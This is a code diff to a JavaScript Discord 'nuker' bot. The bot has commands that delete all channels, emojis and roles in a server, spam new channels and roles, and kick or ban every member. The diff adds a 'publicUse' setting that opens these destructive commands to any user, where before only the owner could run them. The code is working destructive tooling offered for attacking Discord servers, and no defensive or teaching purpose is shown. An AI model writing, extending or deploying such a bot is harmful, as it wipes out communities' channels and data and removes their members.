@@ -1,4 +1,4 @@
-const { token, prefix, randomChannelNames, randomPingMessages, randomRoleNames, ownerId} = require('./config.json');
+const { token, prefix, randomChannelNames, randomPingMessages, randomRoleNames, ownerId, publicUse } = require('./config.json');
 const discord = require('discord.js');
 const discBuilders = require('@discordjs/builders');
 const { red, green, blue, cyan } = require('chalk');
@@ -31,7 +31,11 @@ ${prefix}delroles - delete all roles.
 })
 
 bot.on('messageCreate', msg => {
-	if(msg.content == prefix + 'spamnuke' && msg.member.id == ownerId) {
+	isOwner = false
+	if(msg.member.id == ownerId || publicUse == "true") {
+		isOwner = true
+	}
+	if(msg.content == prefix + 'spamnuke' && isOwner) {
 		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
@@ -47,21 +51,21 @@ bot.on('messageCreate', msg => {
 			msg.guild.roles.create({ name: randomRoleNames[randomRoleNumber], color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
 		}
 		console.log(green(`${msg.guild.name} was spam nuked!`))
-	} else if (msg.content == prefix + 'nuke' && msg.member.id == ownerId) {
+	} else if (msg.content == prefix + 'nuke' && isOwner) {
 		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`${msg.guild.name} was nuked!`))
-	} else if (msg.content == prefix + 'kickall' && msg.member.id == ownerId) {
+	} else if (msg.content == prefix + 'kickall' && isOwner) {
 		msg.guild.members.cache.forEach(member => member.kick().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`All members kicked in ${msg.guild.name}!`))
-	} else if (msg.content == prefix + 'banall' && msg.member.id == ownerId) {
+	} else if (msg.content == prefix + 'banall' && isOwner) {
 		msg.guild.members.cache.forEach(member => member.ban().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`All members banned in ${msg.guild.name}!`))
-	} else if (msg.content == prefix + 'delchannels' && msg.member.id == ownerId) {
+	} else if (msg.content == prefix + 'delchannels' && isOwner) {
 		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`All channels deleted in ${msg.guild.name}!`))
-	} else if (msg.content == prefix + 'delroles' && msg.member.id == ownerId) {
+	} else if (msg.content == prefix + 'delroles' && isOwner) {
 		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
 		console.log(green(`All roles deleted in ${msg.guild.name}!`))
 	}
